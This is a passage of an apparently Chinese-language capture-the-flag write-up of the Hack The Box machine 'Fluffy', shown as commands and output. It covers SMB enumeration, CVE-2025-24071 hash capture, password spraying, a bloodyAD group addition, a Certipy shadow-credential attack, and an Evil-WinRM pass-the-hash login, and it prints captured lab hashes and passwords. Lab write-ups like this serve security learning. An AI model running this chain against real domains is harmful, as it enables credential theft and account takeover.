class="line">supportedSASLMechanisms: GSS-SPNEGO</span><br><span class="line">supportedSASLMechanisms: EXTERNAL</span><br><span class="line">supportedSASLMechanisms: DIGEST-MD5</span><br><span class="line">supportedLDAPVersion: 3</span><br><span class="line">supportedLDAPVersion: 2</span><br><span class="line">supportedLDAPPolicies: MaxPoolThreads</span><br><span class="line">supportedLDAPPolicies: MaxPercentDirSyncRequests</span><br><span class="line">supportedLDAPPolicies: MaxDatagramRecv</span><br><span class="line">supportedLDAPPolicies: MaxReceiveBuffer</span><br><span class="line">supportedLDAPPolicies: InitRecvTimeout</span><br><span class="line">supportedLDAPPolicies: MaxConnections</span><br><span class="line">supportedLDAPPolicies: MaxConnIdleTime</span><br><span class="line">supportedLDAPPolicies: MaxPageSize</span><br><span class="line">supportedLDAPPolicies: MaxBatchReturnMessages</span><br><span class="line">supportedLDAPPolicies: MaxQueryDuration</span><br><span class="line">supportedLDAPPolicies: MaxDirSyncDuration</span><br><span class="line">supportedLDAPPolicies: MaxTempTableSize</span><br><span class="line">supportedLDAPPolicies: MaxResultSetSize</span><br><span class="line">supportedLDAPPolicies: MinResultSets</span><br><span class="line">supportedLDAPPolicies: MaxResultSetsPerConn</span><br><span class="line">supportedLDAPPolicies: MaxNotificationPerConn</span><br><span class="line">supportedLDAPPolicies: MaxValRange</span><br><span class="line">supportedLDAPPolicies: MaxValRangeTransitive</span><br><span class="line">supportedLDAPPolicies: ThreadMemoryLimit</span><br><span class="line">supportedLDAPPolicies: SystemMemoryLimitPercent</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.319</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.801</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.473</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.528</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.417</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.619</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.841</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.529</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.805</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.521</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.970</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1338</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.474</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1339</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1340</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1413</span><br><span class="line">supportedControl: 2.16.840.1.113730.3.4.9</span><br><span class="line">supportedControl: 2.16.840.1.113730.3.4.10</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1504</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1852</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.802</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1907</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1948</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1974</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1341</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2026</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2064</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2065</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2066</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2090</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2205</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2204</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2206</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2211</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2239</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2255</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2256</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2309</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2330</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2354</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.800</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.1670</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.1791</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.1935</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.2080</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.2237</span><br><span class="line">subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=fluffy,DC=htb</span><br><span class="line">serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configur</span><br><span class="line"> ation,DC=fluffy,DC=htb</span><br><span class="line">schemaNamingContext: CN=Schema,CN=Configuration,DC=fluffy,DC=htb</span><br><span class="line">namingContexts: DC=fluffy,DC=htb</span><br><span class="line">namingContexts: CN=Configuration,DC=fluffy,DC=htb</span><br><span class="line">namingContexts: CN=Schema,CN=Configuration,DC=fluffy,DC=htb</span><br><span class="line">namingContexts: DC=DomainDnsZones,DC=fluffy,DC=htb</span><br><span class="line">namingContexts: DC=ForestDnsZones,DC=fluffy,DC=htb</span><br><span class="line">isSynchronized: TRUE</span><br><span class="line">highestCommittedUSN: 217274</span><br><span class="line">dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,</span><br><span class="line"> CN=Sites,CN=Configuration,DC=fluffy,DC=htb</span><br><span class="line">dnsHostName: DC01.fluffy.htb</span><br><span class="line">defaultNamingContext: DC=fluffy,DC=htb</span><br><span class="line">currentTime: 20250528115408.0Z</span><br><span class="line">configurationNamingContext: CN=Configuration,DC=fluffy,DC=htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># search result</span></span><br><span class="line">search: 2</span><br><span class="line">result: 0 Success</span><br><span class="line"></span><br><span class="line"><span class="comment"># numResponses: 2</span></span><br><span class="line"><span class="comment"># numEntries: 1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="To-User"><a href="#To-User" class="headerlink" title="To User"></a>To User</h2><h3 id="NXC"><a href="#NXC" class="headerlink" title="NXC"></a>NXC</h3><h4 id="利用提供的凭据探测smb"><a href="#利用提供的凭据探测smb" class="headerlink" title="利用提供的凭据探测smb"></a>利用提供的凭据探测smb</h4><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! </span><br><span class="line">SMB         10.10.11.69     445    DC01             [*] Enumerated shares</span><br><span class="line">SMB         10.10.11.69     445    DC01             Share           Permissions     Remark</span><br><span class="line">SMB         10.10.11.69     445    DC01             -----           -----------     ------</span><br><span class="line">SMB         10.10.11.69     445    DC01             ADMIN$                          Remote Admin</span><br><span class="line">SMB         10.10.11.69     445    DC01             C$                              Default share</span><br><span class="line">SMB         10.10.11.69     445    DC01             IPC$            READ            Remote IPC</span><br><span class="line">SMB         10.10.11.69     445    DC01             IT              READ,WRITE      </span><br><span class="line">SMB         10.10.11.69     445    DC01             NETLOGON        READ            Logon server share </span><br><span class="line">SMB         10.10.11.69     445    DC01             SYSVOL          READ            Logon server share </span><br></pre></td></tr></table></figure></div>

<p>发现对IT目录有<strong>读写权限</strong></p>
<h4 id="rid-brute得到用户列表"><a href="#rid-brute得到用户列表" class="headerlink" title="rid-brute得到用户列表"></a>rid-brute得到用户列表</h4><details class="blue" data-header-exclude><summary><i class="fa-solid fa-chevron-right"></i>UserList </summary>
              <div class='content'>
              <p>Administrator<br>Guest<br>krbtgt<br>DC01$<br>ca_svc<br>ldap_svc<br>p.agila<br>winrm_svc<br>j.coffey<br>j.fleischman</p>
              </div>
            </details>

<p>随后进行密码喷洒无结果</p>
<h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><p>重点去看smb有什么东西</p>
<p>smclient连进去之后发现有一个pdf文档</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">└─$ smbclient //10.10.11.69/IT -U fluffy.htb/j.fleischman</span><br><span class="line">Password <span class="keyword">for</span> [FLUFFY.HTB\j.fleischman]:</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Wed May 28 07:56:45 2025</span><br><span class="line">  ..                                  D        0  Wed May 28 07:56:45 2025</span><br><span class="line">  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025</span><br><span class="line">  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025</span><br><span class="line">  important.lnk                       A     2164  Wed May 28 07:45:09 2025</span><br><span class="line">  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025</span><br><span class="line">  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025</span><br><span class="line">  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025</span><br><span class="line"></span><br><span class="line">                5842943 blocks of size 4096. 1831331 blocks available</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>查看内容管理员通知要及时去修复以下CVE对应的漏洞</p>
<p>得知可能存在以下漏洞</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20250528132359918.png"
                      alt="image-20250528132359918"
                ></p>
<p>进一步检索发现CVE-2025-24071可利用<a class="link"   target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/Marcejr117/CVE-2025-24071_PoC" >poc<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>按照readme中的利用方法我们先启动一个responder用于接收NetNTLMhash。然后指定文件名来生成exploit.zip文件，之后将生成的文件放到smb中等待用户解压读取。</p>
<p>完成利用后能得到一串NetNTLMhash</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.agila::FLUFFY:9484d2df6a2ad247:9A66EA4C1AEB32DACD1ADD7587732187:0101000000000000806886CC50CDDB01A92A952DAE8409730000000002000800570057005400450001001E00570049004E002D004F004C0048005700570053004F0034004D004A00550004003400570049004E002D004F004C0048005700570053004F0034004D004A0055002E0057005700540045002E004C004F00430041004C000300140057005700540045002E004C004F00430041004C000500140057005700540045002E004C004F00430041004C0007000800806886CC50CDDB01060004000200000008003000300000000000000001000000002000009850210C3B697422BCA38C6B2216E754DBFB52DA16AAC86C61528CEE298FC1640A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310039000000000000000000</span><br></pre></td></tr></table></figure></div>

<p>将哈希发到hashcat中破解可得到对应密码<code>prometheusx-303</code></p>
<p>继续进行密码喷洒</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">└─$ nxc smb 10.10.11.69 -u rid_user.list -p <span class="string">&#x27;prometheusx-303&#x27;</span> --continue-on-success</span><br><span class="line">SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.69     445    DC01             [-] fluffy.htb\Administrator:prometheusx-303 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.69     445    DC01             [-] fluffy.htb\Guest:prometheusx-303 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.69     445    DC01             [-] fluffy.htb\krbtgt:prometheusx-303 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.69     445    DC01             [-] fluffy.htb\DC01$:prometheusx-303 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.69     445    DC01             [-] fluffy.htb\ca_svc:prometheusx-303 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.69     445    DC01             [-] fluffy.htb\ldap_svc:prometheusx-303 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.69     445    DC01             [+] fluffy.htb\p.agila:prometheusx-303 </span><br><span class="line">SMB         10.10.11.69     445    DC01             [-] fluffy.htb\winrm_svc:prometheusx-303 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.69     445    DC01             [-] fluffy.htb\j.coffey:prometheusx-303 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.69     445    DC01             [-] fluffy.htb\j.fleischman:prometheusx-303 STATUS_LOGON_FAILURE </span><br><span class="line">                                                                                                                                                                                            </span><br><span class="line">┌──(kali㉿kali)-[~/HTB/Fluffy]</span><br><span class="line">└─$ nxc winrm 10.10.11.69 -u rid_user.list -p <span class="string">&#x27;prometheusx-303&#x27;</span> --continue-on-success</span><br><span class="line">WINRM       10.10.11.69     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)</span><br><span class="line">WINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\Administrator:prometheusx-303</span><br><span class="line">WINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\Guest:prometheusx-303</span><br><span class="line">WINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\krbtgt:prometheusx-303</span><br><span class="line">WINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\DC01$:prometheusx-303</span><br><span class="line">WINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\ca_svc:prometheusx-303</span><br><span class="line">WINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\ldap_svc:prometheusx-303</span><br><span class="line">WINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\p.agila:prometheusx-303</span><br><span class="line">WINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\winrm_svc:prometheusx-303</span><br><span class="line">WINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\j.coffey:prometheusx-303</span><br><span class="line">WINRM       10.10.11.69     5985   DC01             [-] fluffy.htb\j.fleischman:prometheusx-303</span><br></pre></td></tr></table></figure></div>

<p>可以发现，该用户依然没有winrm权限。</p>
<h3 id="bloodhound"><a href="#bloodhound" class="headerlink" title="bloodhound"></a>bloodhound</h3><p>利用得到的用户凭据进去遛狗</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20250528133730489.png"
                      alt="image-20250528133730489"
                ></p>
<p>可以发现这样一条路径</p>
<p>当前用户对service account组有完全控制权限，这个组又对winrm_svc用户genericwrite权限。</p>
<p>所以接下来的方向很简单，利用对组的控制将自身加组，加组后就能对winrm_svc创建shadow credential进而获得控制权。</p>
<h4 id="加组"><a href="#加组" class="headerlink" title="加组"></a>加组</h4><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HTB/Fluffy]</span><br><span class="line">└─$ bloodyAD --host 10.10.11.69 -d fluffy.htb -u p.agila -p <span class="string">&#x27;prometheusx-303&#x27;</span> add groupMember <span class="string">&#x27;Service Accounts&#x27;</span> p.agila</span><br><span class="line">[+] p.agila added to Service Accounts</span><br></pre></td></tr></table></figure></div>

<h4 id="shadow-credential"><a href="#shadow-credential" class="headerlink" title="shadow credential"></a>shadow credential</h4><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">└─$ certipy -debug shadow auto -username P.AGILA@fluffy.htb -password <span class="string">&#x27;prometheusx-303&#x27;</span> -account winrm_svc -target-ip 10.10.11.69                                                      </span><br><span class="line">Certipy v5.0.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[+] DC host (-dc-host) not specified. Using domain as DC host</span><br><span class="line">[+] Nameserver: None</span><br><span class="line">[+] DC IP: None</span><br><span class="line">[+] DC Host: <span class="string">&#x27;FLUFFY.HTB&#x27;</span></span><br><span class="line">[+] Target IP: <span class="string">&#x27;10.10.11.69&#x27;</span></span><br><span class="line">[+] Remote Name: <span class="string">&#x27;10.10.11.69&#x27;</span></span><br><span class="line">[+] Domain: <span class="string">&#x27;FLUFFY.HTB&#x27;</span></span><br><span class="line">[+] Username: <span class="string">&#x27;P.AGILA&#x27;</span></span><br><span class="line">[+] Trying to resolve <span class="string">&#x27;FLUFFY.HTB&#x27;</span> at <span class="string">&#x27;192.168.0.2&#x27;</span></span><br><span class="line">[+] Authenticating to LDAP server using NTLM authentication</span><br><span class="line">[+] Using NTLM signing: False (LDAP signing: True, SSL: True)</span><br><span class="line">[+] Using channel binding signing: True (LDAP channel binding: True, SSL: True)</span><br><span class="line">[+] Using LDAP channel binding <span class="keyword">for</span> NTLM authentication</span><br><span class="line">[+] LDAP NTLM authentication successful</span><br><span class="line">[+] Bound to ldaps://10.10.11.69:636 - ssl</span><br><span class="line">[+] Default path: DC=fluffy,DC=htb</span><br><span class="line">[+] Configuration path: CN=Configuration,DC=fluffy,DC=htb</span><br><span class="line">[*] Targeting user <span class="string">&#x27;winrm_svc&#x27;</span></span><br><span class="line">[*] Generating certificate</span><br><span class="line">[*] Certificate generated</span><br><span class="line">[*] Generating Key Credential</span><br><span class="line">[*] Key Credential generated with DeviceID <span class="string">&#x27;574a27f7-6fca-f9ee-c0ff-071b052a7f21&#x27;</span></span><br><span class="line">&lt;KeyCredential structure at 0x7fed136a7110&gt;</span><br><span class="line">  | Owner: CN=winrm service,CN=Users,DC=fluffy,DC=htb</span><br><span class="line">  | Version: 0x200</span><br><span class="line">  | KeyID: P5JDrgpSp9lhREFDIpPEqazQBOAn3pvjkWT4b/Zjhsc=</span><br><span class="line">  | KeyHash: 219392ff48b87cdc9e114b2dd388bdb2cbbbd8993713697680cc7fa7472b0a33</span><br><span class="line">  | RawKeyMaterial: &lt;dsinternals.common.cryptography.RSAKeyMaterial.RSAKeyMaterial object at 0x7fed136a6e90&gt;</span><br><span class="line">  |  | Exponent (E): 65537</span><br><span class="line">  |  | Modulus (N): 0xd677b5479779f5772dc8fb84f04f9b873b7a083b6712f16c422539dc8196b52537fc12f08a68e2db3f1a2199d504f1507aaec2a0b94199bc8388464963a5ddc9949c8d8b0574f7fead97879eaf7c6cc029945376e24caa3a623ab5405826a230f83a31c5c36be4286297667d80ee3c622118d3da692af6173368f3db0676bcc20a0ed57c10ee5282eafcf515f4893ab9b171a05bcace5dc23f89efb8ea039328bd689a4cf19297a63528872a7faa139bcc1bfd7b76a473569597f985ed6891f0a52c3baa6a5ddddde6df0f707964ec3e65c44f0752108d94c606b2a753a53406c2cdf1561da75fdfc48ed20817912f8042fa0f773bebc52bd8846c898bab8513</span><br><span class="line">  |  | Prime1 (P): 0x0</span><br><span class="line">  |  | Prime2 (Q): 0x0</span><br><span class="line">  | Usage: KeyUsage.NGC</span><br><span class="line">  | LegacyUsage: None</span><br><span class="line">  | Source: KeySource.AD</span><br><span class="line">  | DeviceId: 574a27f7-6fca-f9ee-c0ff-071b052a7f21</span><br><span class="line">  | CustomKeyInfo: &lt;CustomKeyInformation at 0x7fed133658b0&gt;</span><br><span class="line">  |  | Version: 1</span><br><span class="line">  |  | Flags: KeyFlags.NONE</span><br><span class="line">  |  | VolumeType: None</span><br><span class="line">  |  | SupportsNotification: None</span><br><span class="line">  |  | FekKeyVersion: None</span><br><span class="line">  |  | Strength: None</span><br><span class="line">  |  | Reserved: None</span><br><span class="line">  |  | EncodedExtendedCKI: None</span><br><span class="line">  | LastLogonTime (UTC): 2025-05-28 13:45:01.791393</span><br><span class="line">  | CreationTime (UTC): 2025-05-28 13:45:01.791393</span><br><span class="line">[*] Adding Key Credential with device ID <span class="string">&#x27;574a27f7-6fca-f9ee-c0ff-071b052a7f21&#x27;</span> to the Key Credentials <span class="keyword">for</span> <span class="string">&#x27;winrm_svc&#x27;</span></span><br><span class="line">[*] Successfully added Key Credential with device ID <span class="string">&#x27;574a27f7-6fca-f9ee-c0ff-071b052a7f21&#x27;</span> to the Key Credentials <span class="keyword">for</span> <span class="string">&#x27;winrm_svc&#x27;</span></span><br><span class="line">[*] Authenticating as <span class="string">&#x27;winrm_svc&#x27;</span> with the certificate</span><br><span class="line">[*] Certificate identities:</span><br><span class="line">[*]     No identities found <span class="keyword">in</span> this certificate</span><br><span class="line">[*] Using principal: <span class="string">&#x27;winrm_svc@fluffy.htb&#x27;</span></span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[+] Sending AS-REQ to KDC fluffy.htb (10.10.11.69)</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saving credential cache to <span class="string">&#x27;winrm_svc.ccache&#x27;</span></span><br><span class="line">[+] Attempting to write data to <span class="string">&#x27;winrm_svc.ccache&#x27;</span></span><br><span class="line">File <span class="string">&#x27;winrm_svc.ccache&#x27;</span> already exists. Overwrite? (y/n - saying no will save with a unique filename): y</span><br><span class="line">[+] Data written to <span class="string">&#x27;winrm_svc.ccache&#x27;</span></span><br><span class="line">[*] Wrote credential cache to <span class="string">&#x27;winrm_svc.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;winrm_svc&#x27;</span></span><br><span class="line">[*] Restoring the old Key Credentials <span class="keyword">for</span> <span class="string">&#x27;winrm_svc&#x27;</span></span><br><span class="line">[*] Successfully restored the old Key Credentials <span class="keyword">for</span> <span class="string">&#x27;winrm_svc&#x27;</span></span><br><span class="line">[*] NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;winrm_svc&#x27;</span>: 33bd09dcd697600edf6b3a7af4875767</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="winrm-login"><a href="#winrm-login" class="headerlink" title="winrm login"></a>winrm login</h3><p>登录拿到user.hash</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">└─$ evil-winrm -i 10.10.11.69 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc<span class="string">&#x27; for module Reline</span></span><br><span class="line"><span class="string">                                        </span></span><br><span class="line"><span class="string">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span></span><br><span class="line"><span class="string">                                        </span></span><br><span class="line"><span class="string">Info: Establishing connection to remote endpoint</span></span><br><span class="line"><span class="string">*Evil-WinRM* PS C:\Users\winrm_svc\Documents&gt; whoami</span></span><br><span class="line"><span class="string">fluffy\winrm_svc</span></span><br><span class="line"><span class="string">*Evil-WinRM* PS C:\Users\winrm_svc\Documents&gt; whoami /priv</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">PRIVILEGES INFORMATION</span></span><br><span class="line"><span class="string">----------------------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Privilege Name                Description                    State</span></span><br><span class="line"><span class="string">============================= ============================== =======</span></span><br><span class="line"><span class="string">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span></span><br><span class="line"><span class="string">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span></span><br><span class="line"><span class="string">SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span></span><br><span class="line"><span class="string">*Evil-WinRM* PS C:\Users\winrm_svc\Documents&gt; </span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></div>

<h2 id="To-Root"><a href="#To-Root" class="headerlink" title="To Root"></a>To Root</h2><p>用同样的方法获得ca_svc的权限，然后用certipy来查看攻击路径。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="built_in">cat</span> 20250528095524_Certipy.txt                                                                                                                                                                                                                                                                                                                                                       </span><br><span class="line">Certificate Authorities                                                                       </span><br><span class="line">  0                                                                                           </span><br><span class="line">    CA Name                             : fluffy-DC01-CA                                                                                                                                    </span><br><span class="line">    DNS Name                            : DC01.fluffy.htb                                                                                                                                   </span><br><span class="line">    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb                                                                                                              </span><br><span class="line">    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5                                                                                                                  </span><br><span class="line">    Certificate Validity Start          : 2025-04-17 16:00:16+00:00                                                                                                                         </span><br><span class="line">    Certificate Validity End            : 3024-04-17 16:11:16+00:00                                                                                                                         </span><br><span class="line">    Web Enrollment                                                                            </span><br><span class="line">      HTTP                                                                                    </span><br><span class="line">        Enabled                         : False                                               </span><br><span class="line">      HTTPS                                                                                   </span><br><span class="line">        Enabled                         : False                                               </span><br><span class="line">    User Specified SAN                  : Disabled                                            </span><br><span class="line">    Request Disposition                 : Issue                                               </span><br><span class="line">    Enforce Encryption <span class="keyword">for</span> Requests     : Enabled                                             </span><br><span class="line">    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy                                                                                                      </span><br><span class="line">    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2                                                                                                                              </span><br><span class="line">    Permissions                                                                               </span><br><span class="line">      Owner                             : FLUFFY.HTB\Administrators                                                                                                                         </span><br><span class="line">      Access Rights                                                                           </span><br><span class="line">        ManageCa                        : 